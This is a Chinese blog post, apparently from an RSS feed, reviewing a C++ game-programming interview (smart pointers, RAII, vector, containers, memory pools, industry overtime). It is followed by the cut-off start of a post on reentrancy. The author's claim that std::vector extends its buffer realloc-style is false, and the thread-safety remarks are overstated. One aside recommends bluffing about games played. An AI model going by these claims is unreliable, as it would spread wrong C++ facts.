&lt;p>客套话什么的就略了。&lt;/p>
&lt;blockquote>
&lt;p>面试官：&amp;hellip;行，那我们就聊聊 C++吧。你常用哪个版本的 C++？&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>我：我比较常用的是 C++11。&lt;/p>
&lt;/blockquote>
&lt;p>C++版本这个问题面试里应该不多见，不过作为引入的话题还行，标准之神会瞑目的。&lt;/p>
&lt;p>对于&lt;strong>C++版本&lt;/strong>这个词，很大概率上大家说的应该就是 C++标准委员会&lt;a class="link" href="http://www.open-std.org/JTC1/SC22/WG21/" target="_blank" rel="noopener"
>WG21&lt;/a>制定的 C++标准了，最新版本的标准文档是 C++17 定稿&lt;a class="link" href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2017/n4659.pdf" target="_blank" rel="noopener"
>N4659&lt;/a>，制定中的 C++20 标准文档可以访问&lt;a class="link" href="http://www.open-std.org/JTC1/SC22/WG21/docs/papers/2018/" target="_blank" rel="noopener"
>WG21/docs/papers/2018&lt;/a>查阅。&lt;/p>
&lt;p>需要注意的是，如果答成了&lt;strong>我用 VC6&lt;/strong>之类的骚话，很大概率会留下不好的映像——或者对方也是忠实的 VC6 神教教徒的话，达成共识也说不定。&lt;/p>
&lt;p>闲话少叙。&lt;/p>
&lt;h2 id="1-起手式stdshared_ptr">1. 起手式：&lt;code>std::shared_ptr&lt;/code>&lt;/h2>
&lt;blockquote>
&lt;p>面试官：说说&lt;code>std::shared_ptr&lt;/code>是怎么实现的？一般怎么去使用它？&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>答：&lt;code>shared_ptr&lt;/code>是通过&lt;strong>引用计数&lt;/strong>实现的，它可以作为容器元素，在程序里传递 blabal&amp;hellip;..而且&lt;code>shared_ptr&lt;/code>&lt;strong>不是线程安全的&lt;/strong>，它不能跨线程传递，要额外做一层包装 blabla&amp;hellip;&amp;hellip;&lt;/p>
&lt;/blockquote>
&lt;p>正巧最近有想写一篇智能指针相关的博客，面试官的第一问就提到了。&lt;/p>
&lt;p>说到智能指针，就必须提一下 RAII 了。&lt;/p>
&lt;h3 id="11-异常安全和-raii">1.1 异常安全和 RAII&lt;/h3>
&lt;p>&lt;code>std::shared_ptr&lt;/code>和其他智能指针类型都在&lt;code>&amp;lt;memory&amp;gt;&lt;/code>头文件里定义，主要的作用是实现自动化的资源管理，基于&lt;strong>RAII&lt;/strong>的理念设计和实现。&lt;/p>
&lt;p>&lt;strong>RAII&lt;/strong>指的是&lt;strong>获取资源即初始化&lt;/strong>，英文全写是&lt;strong>Resource Acquisition Is Initialization&lt;/strong>，属于一种面向对象编程语言中常见的惯用法。&lt;/p>
&lt;p>它的思路是这样子的：初始化即获取资源，离开作用域就自动销毁。&lt;/p>
&lt;p>RAII 解决的问题是，当异常发生时，如何确保资源释放。这是个&lt;strong>异常安全&lt;/strong>的问题。&lt;/p>
&lt;p>常见的非 RAII 风格代码里，如果要确保资源被正确释放，就要用&lt;code>try {} catch() {} finally {}&lt;/code>块捕获异常，然后执行资源释放的代码，再将异常重新抛出。&lt;/p>
&lt;p>而 RAII 的理念是，让资源的生命周期和一个栈上的对象严格绑定，确保栈上对象被析构的时候，资源也就被一同释放了。&lt;/p>
&lt;p>在 C++中，有大量的代码都是以 RAII 风格进行设计的，其中智能指针也是。&lt;/p>
&lt;h3 id="12-stdshared_ptr的实现">1.2 &lt;code>std::shared_ptr&lt;/code>的实现&lt;/h3>
&lt;p>引用计数，大概了解过智能指针的人都能回答得出来。&lt;/p>
&lt;p>虽然说实现方式并没有规定只能是引用计数，但实际上大家都是这么写的，万一哪天有个 GC 实现的&lt;code>std::shared_ptr&lt;/code>也别太震惊。&lt;/p>
&lt;p>实现思路也挺简单。&lt;/p>
&lt;p>所有指向同一实例的&lt;code>std::shared_ptr&lt;/code>应当持有同一个引用计数，来保持所有&lt;code>std::shared_ptr&lt;/code>计数同步，所以它们共同拥有一个计数器指针&lt;code>long *p&lt;/code>。&lt;/p>
&lt;p>在复制时，&lt;code>shared_ptr&lt;/code>管理的对象指针和引用计数器指针被同时复制，然后引用计数器指针保存的引用计数+1——销毁同理，减少引用，直到删除。&lt;/p>
&lt;h3 id="13-stdshared_ptr和copyassignable">1.3 &lt;code>std::shared_ptr&lt;/code>和&lt;code>CopyAssignable&lt;/code>&lt;/h3>
&lt;p>&lt;code>std::shared_ptr&lt;/code>满足&lt;code>CopyContructiable&lt;/code>、&lt;code>CopyAssignable&lt;/code>和&lt;code>LessThanComparable&lt;/code>这些标准库的&lt;a class="link" href="https://zh.cppreference.com/w/cpp/named_req" target="_blank" rel="noopener"
>具名要求&lt;/a>，因此可以作为 STL 容器的元素。&lt;/p>
&lt;blockquote>
&lt;p>顺便一提 &lt;code>Concept&lt;/code> 有很大可能出现在 C++20 标准里。&lt;/p>
&lt;/blockquote>
&lt;h3 id="14-线程安全性">1.4 线程安全性&lt;/h3>
&lt;p>&lt;code>std::shared_ptr&lt;/code>不是线程安全的，不然不满足 C++对&lt;code>Zero Cost Abstraction&lt;/code>的要（吹）求（逼）。&lt;/p>
&lt;p>依据官方说法，多线程访问不同的&lt;code>std::shared_ptr&lt;/code>实例是没问题的（大多容器也是）；多线程访问同一个&lt;code>std::shared_ptr&lt;/code>实例，但是只调用&lt;code>const&lt;/code>方法，那么也是没问题的（多线程读）；多线程访问同一个&lt;code>std::shared_ptr&lt;/code>实例，调用非&lt;code>const&lt;/code>方法，那么会产生数据竞争（多线程读写）。&lt;/p>
&lt;p>如果希望在线程间传递 &lt;code>std::shared_ptr&lt;/code> 得靠 STL 提供的原子操作库&lt;code>std::atomic&lt;/code>。&lt;/p>
&lt;p>&lt;code>std::atomic&lt;/code>可以快速帮助包装一个线程安全的对象或者指针，不过这东西对&lt;code>std::shared_ptr&lt;/code>的特化是目前还在制定的&lt;code>C++20&lt;/code>标准的一部分，所以能不用则不用，直到标准制定完成稳定，并且各编译器支持完善后再行考虑。&lt;/p>
&lt;p>除此之外，如果确实有这方面的考虑，引入&lt;code>boost&lt;/code>是一个不错的选择。&lt;/p>
&lt;p>无论如何，跨线程使用&lt;code>std::shared_ptr&lt;/code>我不怎么支持。&lt;/p>
&lt;p>跨线程传递&lt;code>std::shared_ptr&lt;/code>本身就是个非常危险的行为。&lt;code>std::shared_ptr&lt;/code>作为标准库的一员，背负了 C++的历史包袱，它随时可能被取出裸指针使用，或者意外复制了一次或几次，而这些对线程安全几乎就是意味着作死的行为却没有任何管束。&lt;/p>
&lt;h3 id="15-其他智能指针">1.5 其他智能指针&lt;/h3>
&lt;ul>
&lt;li>&lt;code>std::auto_ptr&lt;/code>&lt;/li>
&lt;li>&lt;code>std::weak_ptr&lt;/code>&lt;/li>
&lt;li>&lt;code>std::unique_ptr&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>其中&lt;code>std::auto_ptr&lt;/code>已经被扫进历史的垃圾堆了，作为替代者，&lt;code>std::unique_ptr&lt;/code>有更明确的语义和更高的可定制性。&lt;/p>
&lt;p>&lt;code>std::weak_ptr&lt;/code>是对于&lt;code>std::shared_ptr&lt;/code>的补充，对于希望使用&lt;code>std::shared_ptr&lt;/code>作为使用了指针的数据结构之间的连接方式，又不希望产生循环引用恶劣情况的一个解决方案。弱指针的存在不影响引用计数工作。&lt;/p>
&lt;p>最后是&lt;code>std::unique_ptr&lt;/code>，它的语义是明确唯一持有某一资源，依照约定，被&lt;code>std::unique_ptr&lt;/code>持有的资源不应该再有第二人持有，&lt;code>std::unique_ptr&lt;/code>是唯一访问该资源的入口。&lt;/p>
&lt;p>这些智能指针都有一个共同点：为了兼容 C 代码，所以它们随时可以被取出裸指针而不影响自身的工作，但这种使用方式造成的一切后果自负。&lt;/p>
&lt;h2 id="2-stdvector">2. &lt;code>std::vector&lt;/code>&lt;/h2>
&lt;blockquote>
&lt;p>面试官：&amp;hellip;知道&lt;code>std::vector&lt;/code>吧？讲讲它是怎么实现的。&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>我：vector 保存了一个一定长度的 buffer，当插入时可以避免插入一次就分配一次空间 blabla&amp;hellip;当插入长度超过了 buffer 长度，buffer 会依照内部算法来重新分配一次内存，扩张长度。&lt;/p>
&lt;/blockquote>
&lt;p>回答不全对。其实面试官之后又强调了一次，但面试时没有听出来。&lt;/p>
&lt;blockquote>
&lt;p>面试官：那之前分配的 buffer 呢？&lt;/p>
&lt;p>我：之前分配的 buffer 先复制到新的 buffer 里，然后旧 buffer 会被释放。&lt;/p>
&lt;/blockquote>
&lt;p>这里对于释放旧 buffer 的说法其实是有问题的，可以具体看看下面。&lt;/p>
&lt;h3 id="21-内存布局">2.1 内存布局&lt;/h3>
&lt;p>&lt;code>std::vector&lt;/code>的&lt;strong>内存布局是连续的&lt;/strong>，这一点除了几乎每个人都有所了解之外（&amp;hellip;），标准给出的要求也可以看出点端倪。&lt;/p>
&lt;blockquote>
&lt;p>26.3.11.1 Class template vector overview&lt;/p>
&lt;p>A vector is a sequence container that supports (amortized) constant time insert and erase operations at the end; insert and erase in the middle take linear time. Storage management is handled automatically, though hints can be given to improve eﬃciency.&lt;/p>
&lt;/blockquote>
&lt;p>关键点集中在这里：&lt;/p>
&lt;blockquote>
&lt;p>&amp;hellip; constant time insert and erase operations at the end;&lt;/p>
&lt;/blockquote>
&lt;p>末端插入和删除是常数时间&lt;/p>
&lt;blockquote>
&lt;p>&amp;hellip; insert and erase in the middle take linear time.&lt;/p>
&lt;/blockquote>
&lt;p>中间插入和删除需要线性时间（就是 &lt;code>O(n)&lt;/code>）。&lt;/p>
&lt;p>典型的数组插入和删除的特征，不同的是&lt;code>std::vector&lt;/code>可以变长，所以真正插入大量数据的时候会有多次重新分配内存和复制的操作。&lt;/p>
&lt;h3 id="22-copyassignable的约定">2.2 &lt;code>CopyAssignable&lt;/code>的约定&lt;/h3>
&lt;p>&lt;code>std::vector&lt;/code>要求储存的对象满足&lt;code>DefautConstructible&lt;/code>、&lt;code>CopyContructiable&lt;/code>和&lt;code>CopyAssignable&lt;/code>的具名要求，文档参考&lt;code>26.3.11.1&lt;/code>第 2 节。&lt;/p>
&lt;blockquote>
&lt;p>26.3.11.1&lt;/p>
&lt;p>A vector satisﬁes all of the requirements of a container and of a reversible container (given in two tables in 26.2), of a sequence container, including most of the optional sequence container requirements (26.2.3), of an allocator-aware container (Table 86), and, for an element type other than bool, of a contiguous container (26.2.1).&lt;/p>
&lt;/blockquote>
&lt;p>其中提到的&lt;code>Table 86&lt;/code>中列出了&lt;code>DefaultConstructible&lt;/code>、&lt;code>CopyAssignable&lt;/code>和&lt;code>CopyConstructiable&lt;/code>。&lt;/p>
&lt;p>发挥一下脑洞，这些要求完美符合了之前对于重新分配内存的猜测对不对？&lt;/p>
&lt;p>对象要可以被默认构造，因为&lt;code>vector&lt;/code>的实现可能是&lt;code>new&lt;/code>了一个新的对象数组（更可能是字节数组，到时候再&lt;code>placement new&lt;/code>）；对象要可以被复制构造，因为对象可能被从旧数组移动到新数组；对象要可以被复制构造&amp;hellip;..&lt;/p>
&lt;p>当然更可能的原因是&lt;code>vector&lt;/code>本身是可复制的，上面的就当我吹逼吧。&lt;/p>
&lt;p>除此之外还有&lt;code>CopyInsertable&lt;/code>和&lt;code>MoveInsertable&lt;/code>的具名需求，就像其字面意义那样，不多做解释。&lt;/p>
&lt;h3 id="23-内存重新分配的方式">2.3 内存重新分配的方式&lt;/h3>
&lt;p>对 C 稍有经验的人应该知道 C 语言有一个 API 叫做&lt;code>realloc&lt;/code>，它做的事情是这样的：&lt;/p>
&lt;ol>
&lt;li>如果可能的话，扩张原先分配的内存的长度。&lt;/li>
&lt;li>否则重新分配一块内存，然后把旧的内存复制过去，释放旧内存，返回新指针。&lt;/li>
&lt;li>如果找不到足够长度的连续内存，则返回 NULL，不释放旧内存。&lt;/li>
&lt;/ol>
&lt;p>C++自然不会少。&lt;/p>
&lt;p>面试时没有想起来，本来认为是一种优化方案，但 STL 本身就算是优化方案了吧（&amp;hellip;）。正确的解答应该是&lt;/p>
&lt;blockquote>
&lt;p>用 realloc 的方式尝试扩展 buffer 长度，如果无法扩展长度，则拷贝旧 buffer 到新 buffer，再释放旧 buffer。&lt;/p>
&lt;/blockquote>
&lt;p>还行，失误就是失误，认错复习一遍。&lt;/p>
&lt;h2 id="3-比较三个容器vectormaplist">3. 比较三个容器：&lt;code>vector&lt;/code>,&lt;code>map&lt;/code>,&lt;code>list&lt;/code>&lt;/h2>
&lt;blockquote>
&lt;p>面试官：说说看&lt;code>vector&lt;/code>、&lt;code>list&lt;/code>、&lt;code>map&lt;/code>有什么不同，分别在什么样的上下文环境里去使用它们吧。&lt;/p>
&lt;p>我：vector 可以被随机访问，支持随机访问迭代器，迭代器算法有些不适用在&lt;code>list&lt;/code>和&lt;code>map&lt;/code>上 blabla&amp;hellip;&lt;code>list&lt;/code>通常是链表实现，在插入删除的性能上有优势 blabla&amp;hellip;&amp;hellip;&lt;/p>
&lt;/blockquote>
&lt;p>顺便一提还没说到&lt;code>map&lt;/code>，面试官就换话题了。&lt;/p>
&lt;p>这一题我大概又没有 get 到面试官的 point，单谈论容器的话可说的东西不少，我觉得面试官可能更想了解下我对这些容器的性能和内存方面的认知，可惜我答的有些太浅白了。&lt;/p>
&lt;h3 id="31-迭代器">3.1 迭代器&lt;/h3>
&lt;p>先从迭代器的角度比较三个容器。&lt;/p>
&lt;p>&lt;code>vector&lt;/code>是个典型的随机访问容器，显然支持&lt;code>forward iterator&lt;/code>、&lt;code>reversible iterator&lt;/code>和&lt;code>random access iterator&lt;/code>。典型的实现是&lt;a class="link" href="https://en.wikipedia.org/wiki/Dynamic_array" target="_blank" rel="noopener"
>&lt;code>dynamic array&lt;/code>&lt;/a>。&lt;/p>
&lt;p>&lt;code>list&lt;/code>是个线性结构容器，支持&lt;code>forward iterator&lt;/code>、&lt;code>reversible iterator&lt;/code>。典型的实现是链表。&lt;/p>
&lt;p>&lt;code>map&lt;/code>是个树形容器，支持&lt;code>forward iterator&lt;/code>和&lt;code>reversible iterator&lt;/code>。典型的实现是红黑树。&lt;/p>
&lt;h3 id="32-内存布局和访问效率">3.2 内存布局和访问效率&lt;/h3>
&lt;p>讨论常见实现。&lt;/p>
&lt;p>&lt;code>vector&lt;/code>是连续分配，访问成本低，插入和删除的成本高，会重分配内存。&lt;/p>
&lt;p>&lt;code>list&lt;/code>是不连续分配，访问成本高，任意位置插入删除成本相对低，插入删除不会导致重新分配整块内存。&lt;/p>
&lt;p>&lt;code>map&lt;/code>是不连续分配，插入删除访问成本不应和线性容器比较，毕竟它是关联容器。插入删除的成本都比较高，因为需要重新平衡树。访问时间在标准中的要求是对数时间复杂度，插入时间懒得继续翻标准文档了。&lt;/p>
&lt;h3 id="33-使用上下文">3.3 使用上下文&lt;/h3>
&lt;p>显而易见&lt;code>vector&lt;/code>适合高频读，而&lt;code>list&lt;/code>适合大量插入删除，&lt;code>map&lt;/code>和前面两个迭代器都搭不上调，在需要复杂索引的地方再合适不过了。&lt;/p>
&lt;h3 id="34-线程安全性">3.4 线程安全性&lt;/h3>
&lt;p>这些容器都不是线程安全的。&lt;/p>
&lt;p>依照标准，多线程访问不同的容器实例一切都安好，访问同一个实例的&lt;code>const&lt;/code>方法也 ok，但是非&lt;code>const&lt;/code>方法就会引起数据竞争。&lt;/p>
&lt;p>尤其注意迭代器的选择，这玩意儿有时候不比指针好多少。&lt;/p>
&lt;h2 id="4-如何管理内存资源">4. 如何管理内存资源&lt;/h2>
&lt;blockquote>
&lt;p>面试官：你在项目里一般是怎么管理内存的呢？&lt;/p>
&lt;p>我：一个是尽可能用智能指针，然后是需要频繁构造对象的场合下可以用 placement new blabla&amp;hellip;&lt;/p>
&lt;/blockquote>
&lt;p>内存管理是一个非常广阔的话题，我的回答太过于浅显了。常见的内存管理策略有很多，智能指针只能算是 RAII 这种常见的范式，placement new 算是内存池/对象池的一种写法大概，还有其他很多策略我并不了解也未能涉及。&lt;/p>
&lt;h3 id="41-再论-raii">4.1 再论 RAII&lt;/h3>
&lt;p>RAII 的范式可以确保异常安全，避免手贱忘记回收内存以及底层设计变更抛出的异常无法处理时导致意外的资源泄露。&lt;/p>
&lt;p>诸如此类等等。&lt;/p>
&lt;p>有一些约定可以关注一下。&lt;/p>
&lt;h4 id="411-获取资源失败抛异常">4.1.1 获取资源失败抛异常&lt;/h4>
&lt;p>首先 RAII 的全写是&lt;strong>获取资源即初始化&lt;/strong>，连资源都没能获取的话，构造理应失败，而不是静默给出一个无效的对象。&lt;/p>
&lt;h4 id="412-析构绝不抛异常">4.1.2 析构绝不抛异常&lt;/h4>
&lt;p>很好理解，如果析构又抛个异常出来的话，这个对象还析构不析构？父类还析构不析构？&lt;/p>
&lt;h4 id="423-常见设计">4.2.3 常见设计&lt;/h4>
&lt;p>在 STL 里除了智能指针以 RAII 设计以外，还有加锁解锁相关的内容也是：&lt;code>std::lock_guard&lt;/code>。&lt;/p>
&lt;p>诸如此类的&lt;code>guard&lt;/code>模式也在其他语言中有出现：比如说 C#的&lt;code>using (var file = File.Open(...)) {}&lt;/code>。&lt;/p>
&lt;h3 id="42-内存池和对象池">4.2 内存池和对象池&lt;/h3>
&lt;p>内存池和对象池算是常见的设计范式，基本考虑到大量对象的构造删除的情况都会考虑到使用这两个模式，因为真的很好用（&lt;/p>
&lt;p>内存池的模式主要是预先分配内存，然后在这片内存上构造对象，主要的适用场景是大量频繁构造小对象，构造成本低，生命周期短，内存分配成本居高不下的情况。当然，不仅是这里提到的场景，根据具体业务逻辑可能还会有不同的理由去选择内存池模式。&lt;/p>
&lt;p>对象池区别于内存池的地方在于，对象池的对象构造成本要更高，频繁构造和析构是无法接受的，这种时候就需要一个候选备用的对象池，对象池实现需要对象本身允许被复用在不同的地方，一般来说性能会比较好。内存池则没这个顾虑：反正你需要就构造一个呗。&lt;/p>
&lt;p>这两个池都可以用&lt;code>factory&lt;/code>模式来提供构造对象的服务，而工厂的消费者不需要了解对象是怎么构造出来的。结合 RAII 的话，内存池、对象池里的对象还可以用一层 RAII 设计的“智能指针”封装，使其完成使命后能自动返还资源，等待下一个工厂访客。&lt;/p>
&lt;h2 id="5-玩过哪些游戏对游戏制作流程了解多少">5. 玩过哪些游戏，对游戏制作流程了解多少？&lt;/h2>
&lt;blockquote>
&lt;p>面试官：喜欢玩游戏吗？都玩过哪些游戏？&lt;/p>
&lt;p>我：我的话&amp;hellip;主要玩的是音游，和贵公司业务可能并没有太多关联。&lt;/p>
&lt;p>面试官：除了音乐游戏，有玩过 RPG、ARPG 类型的游戏吗？&lt;/p>
&lt;p>我：像是辐射啊，老滚啊这些&amp;hellip;开放世界类型的游戏游戏性没那么好，比起来我更喜欢电影式的游戏，比如说最近比较火的《底特律：变人》。&lt;/p>
&lt;p>面试官：&amp;hellip;&amp;hellip;（你丫来捣乱的是吧）&lt;/p>
&lt;p>面试官：说说你对游戏行业的看法吧。&lt;/p>
&lt;p>我：游戏行业前景好啊 blablabla&amp;hellip;娱乐崛起 blabla&amp;hellip;经济增长 blabla&amp;hellip;.&lt;/p>
&lt;p>面试官：&amp;hellip;&amp;hellip;（？？？？）&lt;/p>
&lt;p>面试官：你上一家公司也是制作游戏的吧？就是说，你们游戏制作啊，都有哪方面的人在负责做什么东西，大概是怎么个分工合作的样子。（提醒+强调）
我：哦！哦哦，大概就是一个人负责策划整个游戏的玩法和系统，设计每个细节，然后程序负责去实现，自动测试 blabla&amp;hellip;内部试玩 blabla&amp;hellip;&lt;/p>
&lt;/blockquote>
&lt;p>还行，这波操作其实我也是挺佩服自己的。&lt;/p>
&lt;h3 id="51-陷阱玩过哪些游戏">5.1 陷阱：玩过哪些游戏&lt;/h3>
&lt;p>我注意到一件事：在多次面试游戏行业的职位时，都提到这这个问题：&lt;/p>
&lt;blockquote>
&lt;p>你玩过哪些游戏？&lt;/p>
&lt;/blockquote>
&lt;p>也许形式上有所区别：&lt;/p>
&lt;blockquote>
&lt;p>你玩过的游戏里，有哪些特别喜欢的？&lt;/p>
&lt;/blockquote>
&lt;p>换位思考，如果我是面试官，我为什么要问这个问题？我想知道什么？&lt;/p>
&lt;blockquote>
&lt;p>熟悉游戏吗？&lt;/p>
&lt;p>知道游戏有哪些元素吗？&lt;/p>
&lt;p>能理解（我们招你进来要做的游戏）要你做什么吗？&lt;/p>
&lt;/blockquote>
&lt;p>不必太过刻意地表达出对游戏行业的崇拜或者抬高之类的，这一关主要的目的还是引出下文，聊聊对游戏制作流程的理解。如果对面试的公司出的产品有所了解的话可能算是加分项。&lt;/p>
&lt;p>但是，从一个游戏玩家的角度出发，表现出不好的情绪容易留下坏映像——&lt;strong>特别是，绝对不要明显地表达出对国产网游、手游、页游的鄙视！！&lt;/strong>&lt;/p>
&lt;p>从一个玩家的角度出发，我也不喜欢&lt;strong>大部分&lt;/strong>国产的页游手游，但是当着游戏行业公司的面试官的面，表现出&lt;strong>我看不起你&lt;/strong>的态度，知道什么叫作死吗？&lt;/p>
&lt;p>更何况并不是&lt;strong>所有国产游戏&lt;/strong>都是屎，举例来说我现在超喜欢 MUSE DASH 这款国产音游的，手感比兰空 voze、节奏大师之类的好得多，界面也没有像节奏大师那样糊成屎，要不是我的 Unity3D 水平太差我真想给这家 pero pero game 工作室（公司？）投个简历看看。&lt;/p>
&lt;p>除此之外还有就是抱着&lt;strong>拯救国产游戏&lt;/strong>的想法或者态度，又或者&lt;strong>劳资教你们什么才是真正的游戏&lt;/strong>这样的想法或者态度，作死无极限啊。&lt;/p>
&lt;p>比较稳妥的回答方案应该是常见的几个网游，比如说 LOL，DNF，王者荣耀，诸如此类。实际上玩过没玩过&amp;hellip;..咳，不被戳穿就无所谓了。&lt;/p>
&lt;h3 id="52-游戏行业">5.2 游戏行业&lt;/h3>
&lt;p>加班是家常便饭，好像所有游戏行业的公司都会这么说。&lt;/p>
&lt;p>大概了解下几个术语，算是加班界的黑话吧。&lt;/p>
&lt;p>一个是 996。什么意思呢？上午 9 点上班，晚上 9 点下班，一周上 6 天，加班费不用考虑了，不存在的，最多给调休。&lt;/p>
&lt;p>再有一个是大小周。一周上 6 天，一周上 5 天，如此循环。同样，大周加班不算加班费，给调休。&lt;/p>
&lt;p>另外就是调休。如果加班一天，将来某天就可以不扣工资休息一天，直白吧。攒下半年的调休然后一口气给自己放 6 个月假这种事情还是做梦比较好，调休基本上就等于无偿加班了，忙起来的时候劝你别休，不然人手就不够了；那闲下来的时候还能让你一周休 6 天？你敢休公司也不敢让你随便休啊，其他员工怎么看。&lt;/p>
&lt;p>发薪日。网上有人总结，发薪日越接近月中的，或者超过月中的，大多都是怕员工流失的公司，而这些公司往往都不是什么好公司。听起来还是挺有道理的（&lt;/p>
&lt;p>当然，最后还是要靠自己的眼睛去确认这一点。&lt;/p>
&lt;h3 id="53-游戏的制作流程">5.3 游戏的制作流程&lt;/h3>
&lt;p>之前待得确实是一家小公司，甚至算得上工作室级别的超小初创公司，游戏制作方面的知识储备不算充足，写这篇博客的时候又去补习了一下。&lt;/p>
&lt;p>主要的工种分为策划、美术、程序。&lt;/p>
&lt;p>细分的话，策划可能有数值方面的，世界背景人物背景方面的，对话文本方面的，甚至可能有长篇幅的资料啊故事啊这方面的需求。&lt;/p>
&lt;p>美术有 UI 方面的，人物、场景的原画师，3d 模型制作，动画制作，骨骼制作，特效制作，等等方面的。程序经常需要和美术方面的沟通交流。&lt;/p>
&lt;p>程序的话主要分前后端和测试，再加上运维和 DBA 之类的角色。&lt;/p>
&lt;p>细分的话前端根据开发平台不同也有不同的技术栈，图像特效上可能会有更专业的大牛负责，team leader 带队设计架构，分配工作，诸如此类。后端也一样，根据不同的技术抉择，可能整体的人员配置也有所区别，但大家都是程序嘛。&lt;/p>
&lt;p>测试算是比较独立的，编写测试代码是一件很痛苦的事情（&lt;/p>
&lt;p>所以这份疼痛有专人负责承受了：）&lt;/p>
&lt;p>持续集成啊什么的也被承包了，测试或者运维会去负责的。&lt;/p>
&lt;p>DBA 一般公司也用不到，运维多少会两手 SQL，规模更大的公司可能会设置这个专门职位。&lt;/p>
&lt;p>流程上来说，策划给出游戏方案，美术可能会配合做个初稿效果图之类的（更可能是策划自己做个简单的效果图之类的方便说明），程序疯狂实现（崩溃-爆发-认命 循环），测试则配合给出反馈，让程序的脱发状况持续恶化，最后发布，项目黄了。&lt;/p>
&lt;p>哦不是，我是说项目火了，程序们一跃成为 CTO，迎娶白富美，走上人生巅峰。&lt;/p>
&lt;p>（并没有）&lt;/p>
&lt;h2 id="6-尾声">6. 尾声&lt;/h2>
&lt;p>其实这次面试的自我感觉还是不错的，没有犯下太蠢的错误，但是可以改进的地方依然很多，语言组织能力需要进一步提高。&lt;/p>
&lt;p>这篇博客的目的是自我反省，但是这次自我反省的效果并不算好，因为面试官的问题基本上都戳在我懂，但又没真正去深入挖掘的领域。日常使用自然没有问题，但理解却谈不上了。&lt;/p>
&lt;p>如果面试官在细节上稍作追究：比如说 placement new 和 user-defined new 之类的话题上深入，异常安全，或者问个 map 用红黑树实现，红黑树什么原理，那么这次我基本又要挂了。&lt;/p>
&lt;p>关于给出的待遇的问题&amp;hellip;&amp;hellip;我其实很好奇&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>因为我真的才工作一年，不懂啊&amp;hellip;&lt;/p>
&lt;p>一年工作年限，C++我也不知道算什么水平，不知道怎么去横向对比，要 8k 是要多了么&amp;hellip;&lt;/p>
&lt;p>初级职位的意思是待遇初级还是能力初级啊&amp;hellip;&lt;/p>
&lt;p>还有主程一般指的是 team leader 对吗，游戏行业程序是不是干到 team leader 就算到头了&amp;hellip;只能转管理岗了&amp;hellip;&lt;/p></description></item><item><title>可重入和异步安全</title><link>https://nnnewb.github.io/blog/p/%E5%8F%AF%E9%87%8D%E5%85%A5%E5%92%8C%E5%BC%82%E6%AD%A5%E5%AE%89%E5%85%A8/</link><pubDate>Sun, 24 Jun 2018 22:48:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E5%8F%AF%E9%87%8D%E5%85%A5%E5%92%8C%E5%BC%82%E6%AD%A5%E5%AE%89%E5%85%A8/</guid><description>&lt;p>这篇博客主要记录的是关于可重入性的相关定义，以及关于并发安全的思考。&lt;/p>
&lt;h2 id="可重入性">可重入性&lt;/h2>
&lt;p>在不同语言中，由于语言标准以及运行期环境规定的不同，可重入性的具体定义可能有所不同。这里聊的是 C++语言中的可重入性。&lt;/p>
&lt;p>所谓可重入性（&lt;code>reetrant&lt;/code>），指的是同时具备&lt;strong>并发安全&lt;/strong>和&lt;strong>中断安全&lt;/strong>的特征，这是目前为止我对可重入性的认识，也是这篇博客在写下时给可重入性下的定义。&lt;/p>
&lt;p>这个认知可能并不准确，因为在&lt;a class="link" href="https://zh.wikipedia.org/wiki/%E5%8F%AF%E9%87%8D%E5%85%A5" target="_blank" rel="noopener"
>wiki&lt;/a>上的定义是这样的。&lt;/p>
&lt;blockquote>
&lt;p>若一个程序或子程序可以「在任意时刻被中断然后操作系统调度执行另外一段代码，这段代码又调用了该子程序不会出错」，则称其为可重入（reentrant 或 re-entrant）的。即当该子程序正在运行时，执行线程可以再次进入并执行它，仍然获得符合設計時預期的结果。与多线程并发执行的线程安全不同，可重入强调对单个线程执行时重新进入同一个子程序仍然是安全的。&lt;/p>
&lt;/blockquote>
&lt;p>但是在很多中文博客里，聊到可重入性的时候往往也会把并发安全混为一谈。实际上来说的话&amp;hellip;&amp;hellip;一个可重入的函数，常常也是并发安全的。&lt;/p>
&lt;p>那么先从并发安全讲起吧。&lt;/p>
&lt;h2 id="并发安全性和可重入性">并发安全性和可重入性&lt;/h2>
&lt;p>所谓并发安全已经是老生常谈了。&lt;/p>
&lt;p>以一段非常简单的代码为例，我们打算初始化一个对象，这个对象被两个线程共享。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-C++" data-lang="C++">&lt;span class="kt">void&lt;/span> &lt;span class="nf">initialize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Something&lt;/span>&lt;span class="o">**&lt;/span> &lt;span class="n">someshit&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!*&lt;/span>&lt;span class="n">someshit&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="o">*&lt;/span>&lt;span class="n">someshit&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">createSomeShit&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>显而易见，如果线程在执行到特定环节时发生了切换&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-C++" data-lang="C++">&lt;span class="kt">void&lt;/span> &lt;span class="nf">initialize&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Something&lt;/span>&lt;span class="o">**&lt;/span> &lt;span class="n">someshit&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!*&lt;/span>&lt;span class="n">someshit&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">// &amp;lt;-------- 线程切换
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// 线程2() {
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// initialize(something);
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="c1">// }
